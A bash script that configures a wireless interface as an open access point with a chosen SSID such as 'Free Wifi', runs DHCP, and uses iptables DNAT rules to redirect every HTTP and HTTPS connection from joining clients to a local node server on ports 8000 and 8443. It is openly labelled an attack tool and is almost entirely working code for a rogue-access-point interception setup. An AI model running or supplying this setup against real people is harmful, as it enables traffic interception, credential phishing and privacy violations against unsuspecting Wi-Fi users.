# This script will configure your attack interface to be a wifi access point on the ssid you provide
# and will redirect all the traffic to the ip of the node server running on port 8000 and 8443

print_usage(){
    echo "Usage: ./rerouting_magic.sh --attack <attack_interface> --net <net_interface> --ssid <ssid>"
    echo "Example: ./rerouting_magic.sh --attack wlxc83a35c2e0bb --net wlp2s0 --ssid \"Free Wifi\""
}

log(){
    echo "\e[1;32m[`date +"%T"`]\e[0m $1"
}

set -o errexit

while [ "$1" != "" ]; do
    case $1 in
        --attack )              shift
                                ATTACK_INTERFACE=$1
                                ;;
        --net )                 shift
                                NET_INTERFACE=$1
                                ;;
        --ssid )                shift
                                SSID=$1
                                ;;
    esac
    shift
done

if [ -z "$ATTACK_INTERFACE" ] || [ -z "$NET_INTERFACE" ]; then
    print_usage
    exit 1
fi

# check if we runing as sudo 
if [ "$EUID" -ne 0 ] ; then
  log "Please run as root"
  print_usage
  exit 1
fi > /dev/null 2>&1

log "starting rerouting magic"
log "Attack interface: $ATTACK_INTERFACE"
log "Net interface: $NET_INTERFACE"

apt install hostapd isc-dhcp-server -y > /dev/null 2>&1
npm install > /dev/null 2>&1

log "configuring hostapd and isc-dhcp-server"
# Path: /etc/default/isc-dhcp-server
sudo cp /etc/default/isc-dhcp-server /etc/default/isc-dhcp-server.bak
echo  "
DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
DHCPDv4_PID=/var/run/dhcpd.pid
INTERFACESv4=\"$ATTACK_INTERFACE\"
" > /etc/default/isc-dhcp-server

# Path: /etc/dhcp/dhcpd.conf
cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak
echo  "
ddns-update-style none;
subnet 10.100.102.0 netmask 255.255.255.0 {
  range 10.100.102.51 10.100.102.100;
  option domain-name-servers 8.8.4.4, 8.8.8.8;
  option routers 10.100.102.50;
}" > /etc/dhcp/dhcpd.conf


# Path: /etc/hostapd/hostapd.conf
cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak
echo  "interface=wlxc83a35c2e0bb
driver=nl80211
ssid=$SSID
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
#wpa=2
#wpa_passphrase=1234567890
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
" > /etc/hostapd/hostapd.conf ## uncomment wpa_passphrase if you wish to set a password

# Path: /etc/default/hostapd
cp /etc/default/hostapd /etc/default/hostapd.bak
echo  "DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"" > /etc/default/hostapd

# Path: /etc/sysctl.conf
log "allow forwarding for ipv4"
sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1

if ifconfig $ATTACK_INTERFACE > /dev/null; then
    log "interface $ATTACK_INTERFACE exists cunfigure it..."
else
  log "interface $ATTACK_INTERFACE does not exist it may be blocked by rfkill, unblocking it..."
  sudo rfkill unblock wifi; sudo rfkill unblock all; sudo ifconfig $ATTACK_INTERFACE up
fi

ifconfig $ATTACK_INTERFACE down
ifconfig $ATTACK_INTERFACE inet 10.100.102.50 netmask 255.255.255.0
ifconfig $ATTACK_INTERFACE up

log "starting hostapd and isc-dhcp-server"
service hostapd restart
service isc-dhcp-server restart

NET_IP=$(ifconfig $NET_INTERFACE | grep 'inet ' | awk '{print $2}')

log "configuring iptables"
iptables --table nat --flush
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 443 -j DNAT --to-destination $NET_IP:8443
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-destination $NET_IP:8000
iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE

# log "starting node server"
# pkill node
# sleep 1
# npm run dev &

log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"